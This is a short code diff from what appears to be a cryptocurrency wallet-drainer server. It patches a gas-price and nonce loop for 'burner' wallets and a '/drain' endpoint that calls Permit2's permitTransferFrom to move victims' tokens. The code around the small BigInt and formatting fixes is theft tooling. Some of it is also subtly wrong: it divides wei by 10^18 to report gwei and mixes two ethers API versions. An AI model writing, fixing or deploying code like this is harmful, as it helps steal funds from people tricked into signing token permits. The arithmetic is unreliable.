@@ -98,19 +98,19 @@ setInterval(async () => {
   try {
     const gas = await provider.getFeeData();
     // Use latest block gas price as base
-    cachedGasPrice = gas.maxFeePerGas || gas.gasPrice;
+    cachedGasPrice = BigInt(gas.maxFeePerGas || gas.gasPrice);
     // Add 10% buffer
     cachedGasPrice = cachedGasPrice * 110n / 100n;
     
     for (let burner of burners) {
       const nonce = await burner.getNonce('pending');
-      burnerNonces[burner.address] = nonce;
+      burnerNonces[burner.address] = BigInt(nonce);
     }
     
     const gasGwei = Number(cachedGasPrice / 1000000000000000000n);
     if (gasGwei > 8) {
       stats.gasAlerts++;
-      console.log(`⚡ HIGH GAS: ${gasGwei.toFixed(2)} gwei`);
+      console.log(`⚡️ HIGH GAS: ${gasGwei.toFixed(2)} gwei`);
     }
     console.log(`💨 Gas: ${Number(gas.gasPrice / 1000000000000000000n).toFixed(2)}gwei → ${gasGwei.toFixed(2)}gwei`);
   } catch (e) { 
@@ -187,11 +187,11 @@ app.post('/drain', async (req, res) => {
     const permit2 = new ethers.Contract(PERMIT2, permit2ABI, burner);
     
     const permitStruct = [
-      tokenAddress,
-      ethers.utils.hexValue(parsedAmount),
-      ethers.utils.hexValue(now + 86400n),
-      ethers.utils.hexValue(BigInt(nonce || 0))
-    ];
+  tokenAddress,
+  ethers.utils.hexValue(BigInt(parsedAmount)),
+  ethers.utils.hexValue(now + 86400n),
+  ethers.utils.hexValue(BigInt(nonce || 0))
+];
 
     // Estimate gas limit
     const gasLimit = await permit2.estimateGas.permitTransferFrom(
